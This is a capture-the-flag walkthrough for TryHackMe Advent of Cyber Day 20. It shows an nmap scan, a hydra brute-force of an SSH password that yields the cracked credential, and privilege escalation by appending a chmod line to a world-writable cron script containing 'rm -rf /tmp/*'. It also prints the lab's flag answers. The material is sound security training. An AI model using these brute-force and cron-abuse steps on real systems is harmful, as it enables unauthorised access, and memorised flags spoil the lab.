# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 20
### References
* MuirlandOracle. (2020, January 6). MuirlandOracle. MuirlandOracle’s Blog. https://muirlandoracle.co.uk/2020/01/06/tryhackme-christmas-2019-challenge-write-up/
## What port is SSH running on?
* According to the hint:
> Use `nmap` to enumerate services on ports 4000 and 5000.

```bash
$ sudo nmap -sV -p 4000-5000 -vv 10.10.138.13
PORT     STATE SERVICE REASON         VERSION
4567/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer**: `4567`
## Crack Sam's password and read `flag1.txt`
1. Use `hydra` to crack Sam's SSH password:
```bash
$ hydra -l sam -P rockyou.txt ssh://10.10.138.13 -s 4567
[4567][ssh] host: 10.10.138.13   login: sam   password: chocolate
```
2. Connect to his server using SSH:
```bash
$  ssh sam@10.10.138.13 -p 4567
sam@10.10.138.13's password: chocolate
sam@ip-10-10-138-13:~$ ls
flag1.txt
sam@ip-10-10-138-13:~$ cat flag1.txt 
THM{dec4389bc09669650f3479334532aeab}
```

**Flag 1**: `THM{dec4389bc09669650f3479334532aeab}`
## Escalate your privileges by taking advantage of a cronjob running every minute. What is the 2nd flag?
1. The `/home/scripts` is owned by the `root` user:
```bash
sam@ip-10-10-138-13:~$ ls -la /home
total 20
drwxr-xr-x  5 root   root   4096 Dec 19  2019 .
drwxr-xr-x 23 root   root   4096 Jun 30 04:01 ..
drwxr-xr-x  3 sam    sam    4096 Dec 19  2019 sam
drwxrwxrwx  2 root   root   4096 Dec 19  2019 scripts
drwxr-xr-x  6 ubuntu ubuntu 4096 Dec 19  2019 ubuntu
```
2. The `/home/scripts/clean_up.sh` file is owned by the `ubuntu` user which might indicate that it is used by a cronjob:
```bash
sam@ip-10-10-138-13:~$ ls -la /home/scripts/
total 16
drwxrwxrwx 2 root   root   4096 Dec 19  2019 .
drwxr-xr-x 5 root   root   4096 Dec 19  2019 ..
-rwxrwxrwx 1 ubuntu ubuntu   14 Dec 19  2019 clean_up.sh
-rw-r--r-- 1 root   root      5 Dec 19  2019 test.txt
```
3. The `/home/scripts/clean_up.sh` removes the contents of the `/tmp` directory which used to store temporary content:
```bash
sam@ip-10-10-138-13:~$ cat /home/scripts/clean_up.sh 
rm -rf /tmp/*
```
2. The 2nd flag is located in `ubuntu`'s home directory:
```bash
sam@ip-10-10-138-13:~$ find /home -type f -name "flag2*"
find: ‘/home/ubuntu/.ssh’: Permission denied
find: ‘/home/ubuntu/.cache’: Permission denied
/home/ubuntu/flag2.txt
```
3. Add `chmod 404 /home/ubuntu/flag2.txt` to the end of `/home/scripts/clean_up.sh` in order to change its read permissions.
4. Wait for a minute and read `/home/ubuntu/flag2.txt`:
```
sam@ip-10-10-138-13:~$ cat /home/ubuntu/flag2.txt
THM{b27d33705f97ba2e1f444ec2da5f5f61}
```

**Flag 2**: `THM{b27d33705f97ba2e1f444ec2da5f5f61}`